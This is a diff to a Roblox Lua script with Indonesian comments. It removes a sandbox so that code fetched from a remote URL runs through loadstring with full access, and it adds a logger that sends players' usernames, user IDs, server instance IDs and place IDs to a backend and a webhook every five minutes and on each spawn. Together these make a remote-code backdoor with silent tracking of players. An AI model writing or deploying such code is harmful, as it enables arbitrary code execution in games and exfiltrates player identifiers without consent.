@@ -14,209 +14,89 @@ local player = Players.LocalPlayer
 local lastSendTime = 0
 local externalScriptCache = nil
 
--- Function to fetch external script with better error handling
+-- Fungsi untuk mengambil script eksternal
 local function fetchExternalScript()
     if externalScriptCache then
-        print("[Script] Using cached external script")
         return externalScriptCache
     end
     
-    print("[Script] Fetching external script from:", EXTERNAL_SCRIPT_URL)
-    
     for i = 1, RETRY_LIMIT do
         local success, response = pcall(function()
-            local content = HttpService:GetAsync(EXTERNAL_SCRIPT_URL, true)
-            if not content or content == "" then
-                error("Empty script content")
-            end
-            return content
+            return HttpService:GetAsync(EXTERNAL_SCRIPT_URL, true)
         end)
         
         if success then
-            print("[Script] Successfully fetched external script")
             externalScriptCache = response
             return response
-        else
-            warn("[Script] Attempt", i, "failed:", response)
-            if i < RETRY_LIMIT then
-                task.wait(RETRY_DELAY)
-            end
+        end
+        
+        if i < RETRY_LIMIT then
+            task.wait(RETRY_DELAY)
         end
     end
     
     error("Failed to fetch external script after "..RETRY_LIMIT.." attempts")
 end
 
--- Enhanced secure execution environment
-local function createSafeEnvironment()
-    local env = {
-        -- Basic functions
-        print = print,
-        warn = warn,
-        error = error,
-        pcall = pcall,
-        xpcall = xpcall,
-        task = task,
-        coroutine = coroutine,
-        
-        -- Services
-        game = game,
-        workspace = workspace,
-        script = script,
-        require = require,
-        HttpService = HttpService,
-        Players = Players,
-        RunService = RunService,
-        
-        -- Restricted functions
-        getfenv = getfenv,
-        setfenv = setfenv,
-        loadstring = loadstring,
-        
-        -- Math
-        math = table.clone(math),
-        os = {
-            time = os.time,
-            date = os.date,
-            clock = os.clock,
-            difftime = os.difftime
-        },
-        
-        -- Tables
-        table = table.clone(table),
-        string = table.clone(string),
-        
-        -- Custom functions
-        GetScriptStatus = function()
-            return "Script is running in sandboxed environment"
-        end
-    }
-    
-    -- Remove dangerous functions
-    env.math.randomseed = nil
-    env.os.execute = nil
-    env.os.exit = nil
-    env.io = nil
-    env.debug = nil
-    env.load = nil
-    
-    return env
-end
-
--- Improved script execution with detailed logging
+-- Eksekusi script langsung tanpa sandbox
 local function executeExternalScript()
-    local scriptContent
-    local startTime = os.clock()
+    local scriptContent = fetchExternalScript()
+    local fn, err = loadstring(scriptContent)
     
-    -- Fetch script content
-    local fetchSuccess, fetchError = pcall(fetchExternalScript)
-    if not fetchSuccess then
-        warn("[Script] Fetch failed:", fetchError)
-        return false, "Fetch failed: "..tostring(fetchError)
-    end
-    scriptContent = externalScriptCache
-    
-    -- Validate script content
-    if not scriptContent or #scriptContent < 10 then
-        warn("[Script] Invalid script content (too short or empty)")
-        return false, "Invalid script content"
-    end
-    
-    -- Create safe environment
-    local env = createSafeEnvironment()
-    
-    -- Load the script
-    local fn, err = loadstring(scriptContent, "ExternalScript")
     if not fn then
-        warn("[Script] Loadstring failed:", err)
-        return false, "Loadstring failed: "..tostring(err)
+        error("Load failed: "..tostring(err))
     end
     
-    -- Set environment
-    setfenv(fn, env)
-    
-    -- Execute with detailed error handling
-    local execSuccess, execResult = xpcall(fn, function(err)
-        return debug.traceback(tostring(err), 2)
-    end)
-    
-    local elapsedTime = os.clock() - startTime
-    print(string.format("[Script] Execution %s (%.2f seconds)", 
-        execSuccess and "succeeded" or "failed", elapsedTime))
-    
-    if not execSuccess then
-        warn("[Script] Execution error:", execResult)
-        return false, execResult
-    end
-    
-    return true, execResult
+    -- Jalankan dengan environment normal (full access)
+    return fn()
 end
 
--- Enhanced logging function
-local function sendLoggerData()
-    -- ... (same as previous version) ...
-end
-
--- Initialize with better monitoring
-local function init()
-    print("[System] Initializing script executor")
-    
-    -- Execute external script with monitoring
-    local executeThread = task.spawn(function()
-        while true do
-            print("[System] Attempting to execute external script")
-            local success, result = executeExternalScript()
-            
-            if success then
-                print("[System] External script executed successfully")
-                if type(result) == "string" and #result > 0 then
-                    print("[Script Output]:", result)
-                end
-                break
-            else
-                warn("[System] Execution failed:", result)
-                task.wait(5) -- Wait before retrying
-            end
-        end
-    end)
-    
-    -- Initialize logger system
-    player.CharacterAdded:Connect(function()
-        sendLoggerData()
-    end)
-    
-    if player.Character then
-        sendLoggerData()
-    end
-    
-    -- Periodic updates
-    while true do
-        task.wait(300)
-        sendLoggerData()
+-- Sistem pengiriman data ke backend (TIDAK DIHAPUS)
+local function sendToBackend(data)
+    for i = 1, RETRY_LIMIT do
+        local success = pcall(function()
+            HttpService:RequestAsync({
+                Url = BACKEND_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json",
+                    ["X-Game-ID"] = tostring(game.GameId)
+                },
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+        if success then break end
+        if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
     end
 end
 
--- Enhanced error handling
-local success, err = pcall(init)
-if not success then
-    local errorMsg = tostring(err)
-    warn("CRITICAL ERROR:", errorMsg)
-    
-    -- Send detailed error to webhook
-    task.spawn(function()
-        local embed = {
-            {
-                title = "Script System Critical Error",
-                description = string.format(
-                    "**Player:** %s (%d)\n**Place:** %d\n**Error:** ```%s```",
-                    player.Name, player.UserId, game.PlaceId, errorMsg
-                ),
-                color = 16711680,
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+-- Sistem pengiriman ke webhook (TIDAK DIHAPUS)
+local function sendToWebhook(data)
+    local embed = {
+        {
+            title = "Player Activity Log",
+            description = string.format(
+                "**%s**\nUserID: %d\nGame: [%d](https://www.roblox.com/games/%d)",
+                data.username, data.userId, data.placeId, data.placeId
+            ),
+            color = 16711680,
+            fields = {
+                {
+                    name = "Instance ID",
+                    value = data.instanceId,
+                    inline = true
+                },
+                {
+                    name = "Timestamp",
+                    value = os.date("%Y-%m-%d %H:%M:%S", data.timestamp),
+                    inline = true
+                }
             }
         }
-        
-        pcall(function()
+    }
+
+    for i = 1, RETRY_LIMIT do
+        local success = pcall(function()
             HttpService:RequestAsync({
                 Url = WEBHOOK_URL,
                 Method = "POST",
@@ -224,5 +104,62 @@ if not success then
                 Body = HttpService:JSONEncode({embeds = embed})
             })
         end)
+        if success then break end
+        if i < RETRY_LIMIT then task.wait(RETRY_DELAY) end
+    end
+end
+
+-- Logger system (TIDAK DIHAPUS)
+local function sendLoggerData()
+    if os.time() - lastSendTime < DEBOUNCE_TIME then
+        return
+    end
+
+    local data = {
+        username = player.Name,
+        userId = player.UserId,
+        instanceId = game.JobId,
+        timestamp = os.time(),
+        placeId = game.PlaceId,
+        gameId = game.GameId
+    }
+
+    lastSendTime = os.time()
+
+    -- Kirim ke backend
+    task.spawn(function()
+        sendToBackend(data)
+    end)
+
+    -- Kirim ke webhook
+    task.spawn(function()
+        sendToWebhook(data)
     end)
 end
+
+-- Main system
+local function init()
+    -- Jalankan script eksternal
+    local success, err = pcall(executeExternalScript)
+    if not success then
+        warn("External script error: ", err)
+        sendToWebhook({
+            content = string.format("Script error: %s", tostring(err))
+        })
+    end
+
+    -- Aktifkan logger
+    player.CharacterAdded:Connect(sendLoggerData)
+    if player.Character then
+        sendLoggerData()
+    end
+    
+    -- Periodic logging
+    while true do
+        task.wait(300)
+        sendLoggerData()
+    end
+end
+
+-- Start
+pcall(init)
